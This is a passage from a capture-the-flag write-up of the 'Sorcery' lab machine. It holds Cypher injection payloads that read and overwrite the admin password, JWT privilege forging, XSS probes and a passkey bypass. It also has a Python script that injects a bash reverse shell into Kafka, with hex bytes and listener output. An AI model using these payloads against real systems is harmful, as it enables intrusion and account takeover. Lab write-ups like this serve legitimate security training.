    pub fn fetch_privilege_level(id: String) -> UserPrivilegeLevel {
        *PRIVILEGES
            .lock()
            .unwrap()
            .privileges
            .get(&id)
            .unwrap_or(&UserPrivilegeLevel::Client)
    }

    pub fn save_privilege_level(&self) {
        PRIVILEGES
            .lock()
            .unwrap()
            .privileges
            .insert(self.id.clone(), self.privilege_level);
    }
}
```

Found out `UserPrivilegeLevel` is enum and it has 3 levels: `Client`, `Seller`, `Admin`. <br>
&rarr; Chance can be leverage the JWT token and change the number of privilege level to `Admin` so we can forge ourself to be the admin.

When we interact with product, we can see that the `Product` model is defined and it has `id`, `name`, `description`, `is_authorized`, `created_by_id`.
```rust
// /backend/src/db/models/product.rs
use rocket::serde::Serialize;
use serde::Deserialize;

use backend_macros::Model;

use crate::api::auth::UserClaims;
use crate::db::models::user::UserPrivilegeLevel;

#[derive(Model, Serialize, Deserialize)]
pub struct Product {
    pub id: String,
    pub name: String,
    pub description: String,
    pub is_authorized: bool,
    pub created_by_id: String,
}

impl Product {
    pub fn should_show_for_user(&self, claims: &UserClaims) -> bool {
        self.is_authorized
            || claims.privilege_level == UserPrivilegeLevel::Admin
            || self.created_by_id == claims.id
    }
}
```

Once we get to view one product, it gonna assign to that product id.
```rust
// /backend/src/api/products/get_one.rs
use rocket::serde::json::Json;
use serde::Serialize;

use crate::api::auth::RequireClient;
use crate::db::models::product::Product;
use crate::error::error::AppError;

#[derive(Serialize)]
struct Response {
    product: Product,
}

#[get("/<id>")]
pub async fn get_one(guard: RequireClient, id: &str) -> Result<Json<Response>, AppError> {
    let product = match Product::get_by_id(id.to_owned()).await {
        Some(product) => product,
        None => return Err(AppError::NotFound),
    };
    if !product.should_show_for_user(&guard.claims) {
        return Err(AppError::NotFound);
    }
    Ok(Json(Response { product }))
}
```

Notice that there is a call to derive macro provided different functions that are defined in `backend-macros`.

{% raw %}
```rust
// /backend-macros/src/lib.rs
extern crate proc_macro;

use proc_macro::TokenStream;
use quote::quote;
use syn::{parse_macro_input, DeriveInput, Expr, Field, LitStr, Meta};

#[proc_macro_derive(Model, attributes(transient))]
pub fn model_derive(input: TokenStream) -> TokenStream {
    let ast = parse_macro_input!(input as DeriveInput);
    let ident = &ast.ident;
    let struct_name = ident.to_string();

    let data = match ast.data {
        syn::Data::Struct(ref data) => data,
        _ => {
            return quote! {
                compile_error!("Only structs are supported");
            }
            .into()
        }
    };

    struct FieldWithAttributes<'a> {
        field: &'a Field,
        transient_save: Option<String>,
        transient_fetch: Option<String>,
    }

    let fields = match data.fields {
        syn::Fields::Named(ref fields) => fields
            .named
            .iter()
            .map(|field| {
                let mut transient_fetch = None::<String>;
                let mut transient_save = None::<String>;
                if let Some(meta) = field
                    .attrs
                    .iter()
                    .find(|attribute| attribute.path().is_ident("transient"))
                    .and_then(|attribute| match &attribute.meta {
                        Meta::List(meta) => Some(meta),
                        _ => None,
                    })
                {
                    meta.parse_nested_meta(|meta| {
                        struct Iteration<'a> {
                            name: &'a str,
                            variable: &'a mut Option<String>,
                        }
                        for Iteration { name, variable } in [
                            Iteration {
                                name: "fetch",
                                variable: &mut transient_fetch,
                            },
                            Iteration {
                                name: "save",
                                variable: &mut transient_save,
                            },
                        ] {
                            if meta.path.is_ident(name) {
                                if let Ok(value) = meta.value() {
                                    if let Ok(value) = value.parse::<LitStr>() {
                                        *variable = Some(value.value());
                                    }
                                }
                            }
                        }
                        Ok(())
                    })
                    .unwrap();
                }
                FieldWithAttributes {
                    field,
                    transient_save,
                    transient_fetch,
                }
            })
            .collect::<Vec<_>>(),
        _ => {
            return quote! {
                compile_error!("Only named fields are supported");
            }
            .into()
        }
    };

    let properties = fields
        .iter()
        .filter(|field| field.transient_fetch.is_none())
        .map(|FieldWithAttributes { field, .. }| {
            let name = field.ident.as_ref().unwrap();
            quote!(#name: $#name).to_string()
        })
        .collect::<Vec<_>>()
        .join(", ");

    let parameters = fields
        .iter()
        .filter(|field| field.transient_fetch.is_none())
        .map(|&FieldWithAttributes { field, .. }| {
            let name = field.ident.as_ref().unwrap();
            let name_string = name.to_string();
            quote!(.param(#name_string, self.#name.clone()))
        });

    let struct_def = fields.iter().map(
        |FieldWithAttributes {
             field,
             transient_fetch,
             ..
         }| {
            let name = field.ident.as_ref().unwrap();
            let name_string = name.to_string();
            if let Some(transient_function) = transient_fetch {
                let transient_function = syn::parse_str::<Expr>(transient_function).unwrap();
                quote!(#name: Self::#transient_function(
                    node.get::<String>("id").expect("Id not found")
                ))
            } else {
                quote!(#name: node.get(#name_string).expect(&format!("{} not found", #name_string)))
            }
        },
    );

    let save_defs = fields
        .iter()
        .filter(|field| field.transient_save.is_some())
        .map(|FieldWithAttributes { transient_save, .. }| {
            let transient_function =
                syn::parse_str::<Expr>(transient_save.as_ref().unwrap()).unwrap();
            quote!(self.#transient_function();)
        });

    let from_row_function = quote! {
        pub async fn from_row(row: ::neo4rs::Row) -> Option<Self> {
            let node = row.get::<::neo4rs::BoltMap>("result").expect("Result not found");
            Some(Self {
                #(#struct_def),*
            })
        }
    };

    let get_functions = fields.iter().map(|&FieldWithAttributes { field, .. }| {
        let name = field.ident.as_ref().unwrap();
        let type_ = &field.ty;
        let name_string = name.to_string();
        let function_name = syn::Ident::new(
            &format!("get_by_{}", name_string),
            proc_macro2::Span::call_site(),
        );

        quote! {
            pub async fn #function_name(#name: #type_) -> Option<Self> {
                let graph = crate::db::connection::GRAPH.get().await;
                let query_string = format!(
                    r#"MATCH (result: {} {{ {}: "{}" }}) RETURN result"#,
                    #struct_name, #name_string, #name
                );
                let row = match graph.execute(
                    ::neo4rs::query(&query_string)
                ).await.unwrap().next().await {
                    Ok(Some(row)) => row,
                    _ => return None
                };
                Self::from_row(row).await
            }
        }
    });

    let save_function = quote! {
        pub async fn save(&self) -> &Self {
            #(#save_defs)*
            let graph = crate::db::connection::GRAPH.get().await;
            let mut tx = graph.start_txn().await.unwrap();
            let query_string = format!(
                "CREATE (result: {} {{ {} }})",
                #struct_name, #properties
            );
            tx.run(
                ::neo4rs::query(&query_string)
                    #(#parameters)*
            ).await.unwrap();
            tx.commit().await.unwrap();
            self
        }
    };

    let get_all_function = quote! {
        pub async fn get_all() -> Vec<Self> {
            let graph = crate::db::connection::GRAPH.get().await;
            let query_string = format!(
                "MATCH (result: {}) RETURN result",
                #struct_name
            );
            let stream = graph.execute(
                ::neo4rs::query(&query_string)
            ).await.unwrap().into_stream();

            use ::futures::{StreamExt, TryStreamExt, FutureExt};
            stream
                .map_err(|_| ())
                .and_then(|row| Self::from_row(row)
                .map(|result| result.ok_or(())))
                .collect::<Vec<_>>()
                .await
                .into_iter()
                .map(|result| result.ok())
                .flatten()
                .collect::<Vec<_>>()
        }
    };

    quote! {
        impl #ident {
            #(#get_functions)*
            #save_function
            #get_all_function
            #from_row_function
        }
    }
    .into()
}
```
{% endraw %}

Now let's talk about how **Rust procedural macros** work.

1. Procedural Macro Declaration <br>
```rust
// /backend-macros/src/lib.rs
#[proc_macro_derive(Model, attributes(transient))]
pub fn model_derive(input: TokenStream) -> TokenStream {
    // ...
}
```
- `#[proc_macro_derive(Model)]` **registers** a derived macro with the Model name.
- `attribute(transient)` allows the macro to receive additional attributes `#[transient]`.
- This macro will be **compiled** into the `backend_macros` binary.

2. Compile-time Registration <br>
When we compile the project: <br>
- **Crate** `backend_macros` are precompiled.
- Rust compiler **registers** `Model` macros into registry.
- Macros become **available** for other crates to use.

3. Macro Usage Detection <br>
When compiler sees `#[derive(Model)]` in the code: <br>
```rust
// /backend/src/db/models/product.rs
#[derive(Model, Serialize, Deserialize)]
pub struct Product {
    pub id: String,
    pub name: String,
    pub description: String,
    pub is_authorized: bool,
    pub created_by_id: String,
}
```

Complier will: <br>
- **Identify** `Model` as a registered derive macro.
- **Call** function `model_derive` with struct `Product` as input.
- **Replace** derive macro with generated code.

&rarr; Macro takes `TokenStream` of struct and generates: <br>
- `get_by_id` function
- `save` function
- `get_all` function
- `from_row` function

And also this macro create methods that can interact with Neo4j database. If we check back the repo, we can see there is an issue about this.

![Neo4j Issue](/assets/img/sorcery-htb-season8/sorcery-htb-season8_neo4j_issue.png)

### Cypher Injection

When connection all the code and the issue, we will get this query when we view the product.
```sql
MATCH (result: Product { id: "88b6b6c5-a614-486c-9d51-d255f47efb4f" }) RETURN result
```

Since the `id` is user-controlled, we can inject a payload here, together with the one we want to get is `registration_key`. <br>
&rarr; Let's craft query to grab that.

```sql
"}) OPTIONAL MATCH (c:Config) RETURN result { .*, description: coalesce(c.registration_key, result.description) }//
```

This query works like this: <br>
- `"})` to escape `id = "   "` and object `{}` and also to close the `MATCH` clause.
- `OPTIONAL MATCH` will always run and return `c = null` in case of **node** maybe not exist and also have a fallback to `result.description`.
- `coalesce` will return the first non-null value. So if `c.registration_key` is exist, it will return the value of `c.registration_key` otherwise it use `result.description` to alternate.
- `//` to comment out the rest of the query.

```sql
MATCH (result: Product { id: "88b6b6c5-a614-486c-9d51-d255f47efb4f"}) OPTIONAL MATCH (c:Config) RETURN result { .*, description: coalesce(c.registration_key, result.description) }// RETURN result
```

To get to know more about cypher injection, check these two articles: <br>
- [Cypher Injection Cheatsheet](https://pentester.land/blog/cypher-injection-cheatsheet/)
- [Cypher Injection](https://notes.incendium.rocks/pentesting-notes/web/injection/cypher-injection)

And also need to **URL ENCODE** before send it to the server. Can either use encode from BurpSuite or [CyberChef](https://gchq.github.io/CyberChef/#recipe=URL_Encode(true)&input=In0pIE9QVElPTkFMIE1BVENIIChjOkNvbmZpZykgUkVUVVJOIHJlc3VsdCB7IC4qLCBkZXNjcmlwdGlvbjogY29hbGVzY2UoYy5yZWdpc3RyYXRpb25fa2V5LCByZXN1bHQuZGVzY3JpcHRpb24pIH0vLw)

![Registration Key](/assets/img/sorcery-htb-season8/sorcery-htb-season8_registration_key.png)

Got the `registration_key` : `dd05d743-b560-45dc-9a09-43ab18c7a513` which is belong to seller account. <br>
&rarr; Can use it to register a seller account.

![Register Seller](/assets/img/sorcery-htb-season8/sorcery-htb-season8_register_seller.png)

![Seller Login](/assets/img/sorcery-htb-season8/sorcery-htb-season8_seller_login.png)

Can see other section `New Product` where we can create a new product.

Stay there, gonna talk about other way that we can forge ourself to be the admin. <br>
When you check the burp web, we can see this:

![Burp Web](/assets/img/sorcery-htb-season8/sorcery-htb-season8_burp_web.png)

There is a token `eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6ImU3OTQ1ODU5LWViYjktNDUwMi1iODk5LTNkMzEzZjE5ZTZjNiIsInVzZXJuYW1lIjoidGVzdDEyMyIsInByaXZpbGVnZUxldmVsIjowLCJ3aXRoUGFzc2tleSI6ZmFsc2UsIm9ubHlGb3JQYXRocyI6bnVsbCwiZXhwIjoxNzUwMDUwMTQxfQ.M3NCebNm2OyFvVhw1AQXpbWjF9zv1aIWN4c0_vxeU6Q`. <br>
We can go to this [jwt.io](https://jwt.io/) to decode it.

![JWT Decode](/assets/img/sorcery-htb-season8/sorcery-htb-season8_jwt_decode.png)

From there, we can see the `privilege_level` is `0` which is `Client`. <br>
We can either change it to `2` which is `Admin` or `1` which is `Seller` or craft our own python script to generate the token.

![JWT Decode](/assets/img/sorcery-htb-season8/sorcery-htb-season8_jwt_decode2.png)

See that our account `test123` is now `Admin` but there are some limits. <br>
Can not create new product because of **Unauthorized** error.

![Unauthorized](/assets/img/sorcery-htb-season8/sorcery-htb-season8_unauthorized.png)

Back to seller account, let's try some tag `<h1></h1>` to see if it is vulnerable to HTML injection.

![HTML Injection](/assets/img/sorcery-htb-season8/sorcery-htb-season8_html_injection.png)

![HTML Injection](/assets/img/sorcery-htb-season8/sorcery-htb-season8_html_injection2.png)

So we can see from DEVTOOLS, it add and render the tag `<h1></h1>` to the `description` field. <br>
&rarr; This could be vulnerable to XSS.

Let's test about `<script>alert(1)</script>` to see what happen.

![XSS](/assets/img/sorcery-htb-season8/sorcery-htb-season8_xss.png)

![XSS](/assets/img/sorcery-htb-season8/sorcery-htb-season8_xss2.png)

We can see in DEVTOOLS, the `<script>` tag has been added but does not execute. <br>
&rarr; Let's try to alert to our kali machine.

I try this payload: `<img src="http://10.xx.xx.xx:8000/xss" />`.
```bash
└─$ rlwrap -cAr nc -lvnp 8000 
listening on [any] 8000 ...
connect to [10.xx.xx.xx] from (UNKNOWN) [10.xx.xx.xx] 59088
zvI����I�A��W�2~�u�Qc�G�@�@��� �K���OE��%f�!H�ڸ-"s���ڢ�mKB"�+�/�,�0�
�       ����/5
              �

▒
 #
  hhttp/1.1"
3ki ���猧���ۋ��0���^g��C]'2����A(�6�d�;
                                       o��(���Q
y H��Tv�e��1�>H*��]��������ۺM�W)C�▒�^+
���Aޱ��@���6/L��J�ցNp�O �����;w<J%�����0�DU��l��_&���M  zi��▒��c)98"0����,��;6��i�qa
                                                                                    �E����Va��JB�ă�����~��:�A�h���K�M0��-�,.�gM�j24g*��#xΕJ�<c�IO-�G���)g��)|�W4!:�*��]���a#�
<��ю������Br�
             2�.���▒Ԃ|}����th�9�
<��ю������Br�
             2�.���▒Ԃ|}����th�9�
                                /�X0�
```

Got our connection. Let's try to get the cookie from admin or even admin password.

I try every case but seems like not working to get admin password, but I try cypher injection and able to get admin password.
```sql
"}) OPTIONAL MATCH (u:User {username: 'admin'}) RETURN result { .*, description: coalesce(u.password, result.description) }//
```

> **Note**: Remember to URL ENCODE the payload before send it to the server.

![Cypher Injection](/assets/img/sorcery-htb-season8/sorcery-htb-season8_cypher_injection.png)

Got this: <br>
`$argon2id$v=19$m=19456,t=2,p=1$T+K9waOashQqEOcDljfe5Q$X5Yul0HakDZrbkEDxnfn2KYJv/BdaFsXn7xNwS1ab8E` <br>
&rarr; Let's try if we can crack this to get plaintext password.

Found this repo [Argon2Crack](https://github.com/CyberKnight00/Argon2_Cracker) is a good tool for recovering Argon2 hash.

```bash
└─$ ./crack_argon2.py -c '$argon2id$v=19$m=19456,t=2,p=1$T+K9waOashQqEOcDljfe5Q$X5Yul0HakDZrbkEDxnfn2KYJv/BdaFsXn7xNwS1ab8E'
```

When I hit enter, this machine is frozen for a while so I need to cancel the process and as the result, we got pretty far. <br>
&rarr; Let's use the cypher injection to change the admin password.

But first we need to use argon2 library to generate the hash of the password.
```bash
└─$ python3 -c "import argon2; print(argon2.PasswordHasher().hash('P@ssword@123'))"
$argon2id$v=19$m=102400,t=2,p=8$5yNzSyjBWFb+8J61AawPkg$R9x9FEBYERukEvHc+DDfQA
```

Next craft the query to inject.
```sql
"}) OPTIONAL MATCH (u:User {username: 'admin'}) SET u.password = '$argon2id$v=19$m=65536,t=3,p=4$5yNzSyjBWFb+8J61AawPkg$R9x9FEBYERukEvHc+DDfQA' RETURN result { .*, name: coalesce('admin_password_updated', result.name) }//
```

Remember to **URL ENCODE** through [CyberChef](https://gchq.github.io/CyberChef/#recipe=URL_Encode(true)&input=In0pIE9QVElPTkFMIE1BVENIICh1OlVzZXIge3VzZXJuYW1lOiAnYWRtaW4nfSkgU0VUIHUucGFzc3dvcmQgPSAnJGFyZ29uMmlkJHY9MTkkbT02NTUzNix0PTMscD00JDV5TnpTeWpCV0ZiKzhKNjFBYXdQa2ckUjl4OUZFQllFUnVrRXZIYytERGZRQScgUkVUVVJOIHJlc3VsdCB7IC4qLCBuYW1lOiBjb2FsZXNjZSgnYWRtaW5fcGFzc3dvcmRfdXBkYXRlZCcsIHJlc3VsdC5uYW1lKSB9Ly8)

![Admin Password Updated](/assets/img/sorcery-htb-season8/sorcery-htb-season8_admin_password_updated.png)

Got the admin password updated. <br>
&rarr; Let's try to login with the new password.

![Admin Login](/assets/img/sorcery-htb-season8/sorcery-htb-season8_admin_login.png)

Got the admin dashboard. Found 3 more functions: <br>
- `DNS`
- `Debug`
- `Blog`

Let's check them out.

When click on `DNS`, we can see this:

![DNS](/assets/img/sorcery-htb-season8/sorcery-htb-season8_dns.png)

We got `Unauthorized` also the same problem for `Debug` and `Blog` which we need to auth with passkey. <br>
When we click the `Enroll Passkey` button, we can see this:

![Enroll Passkey](/assets/img/sorcery-htb-season8/sorcery-htb-season8_enroll_passkey2.png)


### WebAuthn
Need to a way to get this. After a while of researching, I found this article from Chrome for developers [webauthn](https://developer.chrome.com/docs/devtools/webauthn). <br>
&rarr; Apply this concept to get the passkey.

First let's go to DevTools and click on `WebAuthn` tab.

![WebAuthn](/assets/img/sorcery-htb-season8/sorcery-htb-season8_webauthn.png)

Then tick on `Enable virtual authenticator environment` and click the other box as image below.

![WebAuthn](/assets/img/sorcery-htb-season8/sorcery-htb-season8_webauthn2.png)

After adding it, we can see this:

![WebAuthn](/assets/img/sorcery-htb-season8/sorcery-htb-season8_webauthn3.png)

Now do not close yet the DevTools, keep it and logout and sign in again on the Passkey page.

![WebAuthn](/assets/img/sorcery-htb-season8/sorcery-htb-season8_webauthn4.png)

Check again those 3 sections, we can see that we can access to them now.

![WebAuthn](/assets/img/sorcery-htb-season8/sorcery-htb-season8_webauthn5.png)

![WebAuthn](/assets/img/sorcery-htb-season8/sorcery-htb-season8_webauthn6.png)

![WebAuthn](/assets/img/sorcery-htb-season8/sorcery-htb-season8_webauthn7.png)

For the `Blog` section, we can see that it just mention **Phising Training** and **Phising awareness** which we got these information from the source code.

Let's move on the to `DNS` section.

### DNS
When we click on `Force Records Re-fetch` button, we can see this:

![DNS](/assets/img/sorcery-htb-season8/sorcery-htb-season8_dns2.png)

Check the source code to understand how it works.

```rust
// /dns/src/main.rs
use kafka::client::FetchOffset;
use kafka::consumer::{Consumer, GroupOffsetStorage};
use kafka::producer::{Producer, Record, RequiredAcks};
use serde::Serialize;
use std::process::Command;
use std::time::Duration;
use std::{fs, str};

#[derive(Serialize, Debug)]
struct Entry {
    name: String,
    value: String,
}

fn fetch_entries() -> Vec<Entry> {
    let config = fs::read_to_string("/dns/entries").expect("Read config");
    config
        .split("\n")
        .filter(|line| !line.trim().is_empty())
        .map(|line| {
            let components = line.trim().split(" ").collect::<Vec<_>>();
            Entry {
                name: components[1].to_string(),
                value: components[0].to_string(),
            }
        })
        .collect()
}

fn main() {
    dotenv::dotenv().ok();
    let broker = std::env::var("KAFKA_BROKER").expect("KAFKA_BROKER");

    let topic = "update".to_string();
    let group = "update".to_string();

    let mut consumer = Consumer::from_hosts(vec![broker.clone()])
        .with_topic(topic)
        .with_group(group)
        .with_fallback_offset(FetchOffset::Earliest)
        .with_offset_storage(Some(GroupOffsetStorage::Kafka))
        .create()
        .expect("Kafka consumer");

    let mut producer = Producer::from_hosts(vec![broker])
        .with_ack_timeout(Duration::from_secs(1))
        .with_required_acks(RequiredAcks::One)
        .create()
        .expect("Kafka producer");

    println!("[+] Started consumer");

    loop {
        let Ok(message_sets) = consumer.poll() else {
            continue;
        };

        for message_set in message_sets.iter() {
            for message in message_set.messages() {
                let Ok(command) = str::from_utf8(message.value) else {
                    continue;
                };

                println!("[*] Got new command: {}", command);

                let mut process = match Command::new("bash").arg("-c").arg(command).spawn() {
                    Ok(process) => process,
                    Err(error) => {
                        println!("[-] {error}");
                        continue;
                    }
                };

                if let Err(error) = process.wait() {
                    println!("[-] {error}");
                    continue;
                }

                let entries = fetch_entries();

                println!("[*] Entries: {:?}", entries);

                let Ok(value) = serde_json::to_string(&entries) else {
                    continue;
                };

                producer
                    .send(&Record {
                        key: (),
                        value,
                        topic: "get",
                        partition: -1,
                    })
                    .ok();
            }
            consumer.consume_messageset(message_set).ok();
        }
        consumer.commit_consumed().ok();
    }
}
```

We can see that when clicking that button, the system will use kafka to receive commands from **update** topic. <br>
Every message is a shell command that will be executed using bash.
```rust
let mut process = match Command::new("bash").arg("-c").arg(command).spawn() {
                    Ok(process) => process,
                    Err(error) => {
                        println!("[-] {error}");
                        continue;
                    }
                };
```

After running, it will read the file `/dns/entries` and parse into list `Entry { name, value }`. <br>
Then convert to JSON and send to `get` topic. <br>
&rarr; These information will be useful later on. Let's up to `Debug` section.

### Debug
AS we can see from the image above, it has `host:port`, `Add data field` button, a tick box for `Keep alive` and `Expect response?` that we can pressed the `Send` button. <br>
&rarr; Let's see if we can connect back to our kali machine.

![Debug](/assets/img/sorcery-htb-season8/sorcery-htb-season8_debug.png)

Got back our connection. Let's go through the source code.

```rust
// /backend/src/api/debug/debug.rs
use crate::api::auth::{RequireAdmin, RequirePasskey};
use crate::error::error::AppError;
use rocket::serde::json::Json;
use rocket::serde::Serialize;
use serde::Deserialize;
use std::io::{Read, Write};
use std::net::TcpStream;
use std::str;
use std::time::Duration;

#[derive(Deserialize)]
struct Request {
    host: String,
    port: u16,
    data: Vec<String>,
    #[serde(default)]
    expect_result: bool,
    #[serde(default)]
    keep_alive: bool,
}

#[derive(Serialize)]
struct Response {
    data: Option<Vec<String>>,
}

#[post("/port", data = "<data>")]
pub fn port_data(
    _guard1: RequireAdmin,
    _guard2: RequirePasskey,
    data: Json<Request>,
) -> Result<Json<Response>, AppError> {
    let Ok(mut stream) = TcpStream::connect(format!("{}:{}", data.host, data.port)) else {
        return Err(AppError::NotFound);
    };

    if stream
        .set_read_timeout(Some(Duration::from_secs(5)))
        .is_err()
    {
        return Err(AppError::Unknown);
    }

    let mut response: Option<Vec<String>> = match data.expect_result {
        true => Some(vec![]),
        false => None,
    };

    for request in data.data.iter() {
        let Ok(to_send) = hex::decode(request) else {
            return Err(AppError::WrongInput);
        };

        if stream.write(to_send.as_slice()).is_err() {
            return Err(AppError::Unknown);
        }

        if data.expect_result {
            let mut result = Vec::new();
            stream.read_to_end(&mut result).ok();
            response.as_mut().unwrap().push(hex::encode(&result));
        }
    }

    if data.keep_alive {
        tokio::task::spawn(async move {
            let _ = stream;
            tokio::time::sleep(Duration::from_secs(60)).await;
            drop(stream);
        });
    }

    Ok(Json(Response { data: response }))
}
```

From this code, the flow is: <br>
- Open a TCP connection to the host and port.
- Send each hex-encoded string in the `data` field to the host through socket.
- If `expect_result` is true, it will read the response and encode back to hex.
- If `keep_alive` is true, it will keep the connection alive for 60 seconds.

&rarr; This one use to test and interact with raw TCP services has it own data format. Since, Kafka is a message broker, it has its own data format. <br>
&rarr; Suitable way to solve this problem is to spawn a personal Kafka instance using **Docker**. When sending a message to the **update** topic, use **Wireshark** to filter out `tcp.port == 9092` and then select the one that contains the raw bytes, use that to send to the debug section.

The attack flow gonna be: `/dashboard/debug → Admin Debug Endpoint → TCP to kafka:9092 → Inject Message → DNS Service RCE` <br>

First need to add some other stuff to `docker-compose.yml` to run a personal Kafka instance.

```yaml
kafka:
    restart: always
    build: kafka
    environment:
      CLUSTER_ID: pXWI6g0JROm4f-1iZ_YH0Q
      KAFKA_NODE_ID: 1
      KAFKA_LISTENER_SECURITY_PROTOCOL_MAP: CONTROLLER:PLAINTEXT,PLAINTEXT:PLAINTEXT
      KAFKA_LISTENERS: PLAINTEXT://0.0.0.0:9092,CONTROLLER://0.0.0.0:9093
      KAFKA_ADVERTISED_LISTENERS: PLAINTEXT://localhost:9092
      KAFKA_PROCESS_ROLES: broker,controller
      KAFKA_CONTROLLER_QUORUM_VOTERS: 1@localhost:9093
      KAFKA_CONTROLLER_LISTENER_NAMES: CONTROLLER
      KAFKA_LOG_DIRS: /var/lib/kafka/data
      KAFKA_OFFSETS_TOPIC_REPLICATION_FACTOR: 1
      KAFKA_TRANSACTION_STATE_LOG_REPLICATION_FACTOR: 1
      KAFKA_TRANSACTION_STATE_LOG_MIN_ISR: 1
    ports:
      - "9092:9092"
      - "9093:9093"
    healthcheck:
      test: ["CMD", "bash", "-c", "cat < /dev/null > /dev/tcp/kafka/9092"]
      interval: 5s
      timeout: 10s
      retries: 5
```

And also create a `kafka` folder and add a `Dockerfile` to build the image.

```dockerfile
# Use Confluent's official Kafka image
FROM confluentinc/cp-kafka:latest

# Expose broker and controller ports
EXPOSE 9092 9093
```

Start the Kafka instance.

```bash
└─$ sudo docker-compose up -d kafka
WARN[0000] The "KAFKA_BROKER" variable is not set. Defaulting to a blank string. 
WARN[0000] The "GITEA_USERNAME" variable is not set. Defaulting to a blank string. 
WARN[0000] The "GITEA_EMAIL" variable is not set. Defaulting to a blank string. 
WARN[0000] The "GITEA_PASSWORD" variable is not set. Defaulting to a blank string. 
WARN[0000] The "CA_FILE" variable is not set. Defaulting to a blank string. 
WARN[0000] The "EXPECTED_RECIPIENT" variable is not set. Defaulting to a blank string. 
WARN[0000] The "MAIL_BOT_INTERVAL" variable is not set. Defaulting to a blank string. 
WARN[0000] The "PHISHING_USERNAME" variable is not set. Defaulting to a blank string. 
WARN[0000] The "PHISHING_PASSWORD" variable is not set. Defaulting to a blank string. 
WARN[0000] The "MAILHOG_SERVER" variable is not set. Defaulting to a blank string. 
WARN[0000] The "EXPECTED_DOMAIN" variable is not set. Defaulting to a blank string. 
WARN[0000] The "SMTP_SERVER" variable is not set. Defaulting to a blank string. 
WARN[0000] The "SMTP_PORT" variable is not set. Defaulting to a blank string. 
WARN[0000] The "DATABASE_HOST" variable is not set. Defaulting to a blank string. 
WARN[0000] The "DATABASE_USER" variable is not set. Defaulting to a blank string. 
WARN[0000] The "DATABASE_PASSWORD" variable is not set. Defaulting to a blank string. 
WARN[0000] The "SITE_ADMIN_PASSWORD" variable is not set. Defaulting to a blank string. 
WARN[0000] The "KAFKA_BROKER" variable is not set. Defaulting to a blank string. 
WARN[0000] The "API_PREFIX" variable is not set. Defaulting to a blank string. 
WARN[0000] The "DATABASE_USER" variable is not set. Defaulting to a blank string. 
WARN[0000] The "DATABASE_PASSWORD" variable is not set. Defaulting to a blank string. 
[+] Running 2/2
 ✔ Network infrastructure_default    Created                                                                                                                                                                                                                                                                           0.3s 
 ✔ Container infrastructure-kafka-1  Started
```

Second, create a python script to send a message to the **update** topic.

```python
#!/usr/bin/env python3
from kafka import KafkaProducer
import sys

def send_reverse_shell(target_ip, target_port, kafka_host='localhost:9092'):
    try:
        # Create producer
        producer = KafkaProducer(bootstrap_servers=[kafka_host])
        
        # Reverse shell payload
        payload = f'/bin/bash -i >& /dev/tcp/{target_ip}/{target_port} 0>&1'.encode()
        
        # Send message
        future = producer.send('update', value=payload)
        result = future.get(timeout=10)
        
        print(f"[+] Sent reverse shell to {target_ip}:{target_port}")
        print(f"[+] Topic: {result.topic}, Partition: {result.partition}")
        
        producer.close()
        return True
        
    except Exception as e:
        print(f"[-] Error: {e}")
        return False

if __name__ == "__main__":
    if len(sys.argv) != 3:
        sys.exit(1)
    
    target_ip = sys.argv[1]
    target_port = sys.argv[2]
    
    print("[*] Starting Kafka exploit...")
    send_reverse_shell(target_ip, target_port)
```

```bash
└─$ python3 kafka_message_publisher.py 10.xx.xx.xx 1337
[*] Starting Kafka exploit...
[+] Sent reverse shell to 10.xx.xx.xx:1337
[+] Topic: update, Partition: 0
```

Ohh, before running this script, turn on the **Wireshark** and choose the `loopback` interface. <br>
Then when running the script, just filter out `tcp.port==9092`.

![Wireshark](/assets/img/sorcery-htb-season8/sorcery-htb-season8_wireshark.png)

Select the one that has `Kafka Produce v7 Response` and then right click and select `Follow` > `TCP Stream`.

![Wireshark](/assets/img/sorcery-htb-season8/sorcery-htb-season8_wireshark_follow.png)

Will see a raw bytes, check each of them and see that this one is the one we need.

![Wireshark](/assets/img/sorcery-htb-season8/sorcery-htb-season8_wireshark_raw.png)

```bash
000000b3000000070000000200176b61666b612d707974686f6e2d70726f64756365722d31ffff0001000075300000000100067570646174650000000100000000000000720000000000000000000000660000000002751178f4000000000000000001977ba82987000001977ba82987ffffffffffffffffffffffffffff0000000168000000015c2f62696e2f62617368202d69203e26202f6465762f7463702f31302e31302e31342e31302f3133333720303e263100
```

Cause when you select this one, we can see there is our payload.

![Wireshark](/assets/img/sorcery-htb-season8/sorcery-htb-season8_wireshark_raw_2.png)

Now let's add this to the **Debug** section. Also start a listener on our kali machine. <br>
> Be sure to put host is `Kafka` and port is `9092` and also tick the `Keep alive` box.

```bash
└─$ rlwrap -cAr nc -lvnp 1337
listening on [any] 1337 ...
```

![Debug](/assets/img/sorcery-htb-season8/sorcery-htb-season8_debug_3.png)

BOOM! Got the reverse shell.

```bash
└─$ rlwrap -cAr nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.xx.xx.xx] from (UNKNOWN) [10.129.xx.xx] 35394
bash: cannot set terminal process group (8): Inappropriate ioctl for device
bash: no job control in this shell
bash: /root/.bashrc: Permission denied
user@7bfb70ee5b9c:/app$
```

So this shell is not really interactive so I use [penelope](https://github.com/brightio/penelope) to make it more handler and interactive.

```bash
└─$ python3 penelope.py 1337   
[+] Listening for reverse shells on 0.0.0.0:1337 →  127.0.0.1 • 172.xx.xx.xx • 10.xx.xx.xx • 172.xx.xx.xx • 172.xx.xx.xx
- 🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from 7bfb70ee5b9c~10.129.xx.xx-Linux-x86_64 😍 Assigned SessionID <1>
[+] Attempting to upgrade shell to PTY...
[+] Shell upgraded successfully using /usr/bin/python3! 💪
[+] Interacting with session [1], Shell Type: PTY, Menu key: F12 
[+] Logging to /home/kali/.penelope/7bfb70ee5b9c~10.129.xx.xx-Linux-x86_64/2025_06_16-10_22_37-877.log 📜
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
bash: /root/.bashrc: Permission denied
user@7bfb70ee5b9c:/app$
```

Let's recon around. As we know that there is a ftp and mail service running on the machine. <br>
We can use [getent](https://man7.org/linux/man-pages/man1/getent.1.html) to IP address look up.

```bash
user@7bfb70ee5b9c:/app$ getent hosts ftp
172.19.0.3      ftp
user@7bfb70ee5b9c:/app$ getent hosts mail
172.19.0.7      mail
```

